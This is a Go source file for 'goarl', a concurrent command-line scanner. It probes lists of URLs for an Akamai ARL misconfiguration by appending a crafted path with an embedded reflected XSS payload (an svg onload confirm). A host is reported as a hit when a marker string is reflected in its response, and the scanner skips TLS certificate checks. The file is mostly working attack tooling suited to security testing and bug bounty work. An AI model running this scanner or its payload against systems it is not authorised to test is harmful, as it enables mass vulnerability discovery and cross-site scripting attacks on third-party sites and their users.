/*

goarl
- takes a list of urls and checks for an Akamai ARL configuration issue
- see here for more details on the vuln https://warandcode.com/post/akamai-arl-hack/

usage
$ cat urls.txt | goarl

options:

 -c int = concurrency (default 20; 50 is quick)
 -v = verbose (for added info)
 -t = timeout (milliseconds, if you want to adjust the timeout for HTTP GET request attempts)

*/

package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var verbose bool

func main() {

	// concurrency flag
	var concurrency int
	flag.IntVar(&concurrency, "c", 20, "set the concurrency level")

	// timeout flag
	var to int
	flag.IntVar(&to, "t", 10000, "timeout (milliseconds)")

	// verbose flag
	flag.BoolVar(&verbose, "v", false, "get more info on URL attempts")

	flag.Parse()

	// make an actual time.Duration out of the timeout
	timeout := time.Duration(to * 1000000)

	// custom transport to be used with the client 
	var tr = &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   timeout,
			KeepAlive: time.Second,
		}).DialContext,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	// custom http client
	client := &http.Client{
		Transport:     tr,
		CheckRedirect: re,
		Timeout:       timeout,
	}

	// make a urls channel
	urls := make(chan string)

	// spin up workers
	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)

		go func() {
			for url := range urls {

				// if a reflected vuln is found, print
				if isVulnerable(client, url) {
					if verbose {
						fmt.Printf("[*]	Potential hit found at %s\n", url)
					} else {
						fmt.Printf("%s\n",url)	
					}
					continue
				}

			}
			wg.Done()
		}()
	}

	// read user input
	var input_urls io.Reader
	input_urls = os.Stdin

	arg_url := flag.Arg(0)
	if arg_url != "" {
		input_urls = strings.NewReader(arg_url)
	}

	sc := bufio.NewScanner(input_urls)

	// send each line of text to urls
	for sc.Scan() {
		urls <- sc.Text()
	}

	// once all urls are sent, close the channel
	close(urls)

	// check there were no errors reading stdin (unlikely)
	if err := sc.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "[!]	failed to read input: %s\n", err)
	}

	// wait until all the workers have finished
	wg.Wait()

} 

func isVulnerable (client *http.Client, url string) bool {

	if verbose {
		fmt.Printf("Attempting %s\n", url)

	}

	// TODO - check if the url ends with / or not

	// perform the GET request
	_url := url + "/7/100/33/1d/www.citysearch.com/search?what=reallylongstringtomakethepayloadforxssmoveoutofview&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E"
	
	req, err := http.NewRequest("GET", _url, nil)
	if err != nil {
		return false
	}
	// set custom UA coz it's 1337
	req.Header.Set("User-Agent", "goarl/1.0")
	req.Header.Add("Connection", "close")
	req.Close = true

	resp, err := client.Do(req)
	
	// assuming a response, read the body
	if resp != nil  && resp.StatusCode == 200 {
		
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
				return false
		}

		bodyString := string(bodyBytes)

		// check for reflected XSS
		if ( strings.Contains(bodyString, "reallylongstringtomakethepayloadforxssmoveoutofview") ) {
			return true
		}

	}

	if err != nil {
		return false
	}

	return false
}